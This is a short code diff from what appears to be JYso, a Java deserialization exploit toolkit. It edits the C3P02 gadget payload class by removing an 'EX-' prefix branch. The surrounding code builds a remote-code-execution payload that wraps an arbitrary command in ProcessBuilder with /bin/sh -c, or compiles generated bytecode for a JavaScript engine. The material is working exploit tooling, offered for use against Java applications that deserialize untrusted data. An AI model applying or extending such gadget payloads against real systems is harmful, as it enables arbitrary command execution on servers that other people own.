@@ -30,7 +30,7 @@ import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.generateClass;
 public class C3P02 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
-        if (command.startsWith("EX-") || command.startsWith("LF-")) {
+        if (command.startsWith("LF-")) {
             command = getJSEngineValue(generateClass(command).toBytecode()).replace("\"", "\\\"");
         } else {
             command = "new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + command + "']).start()";
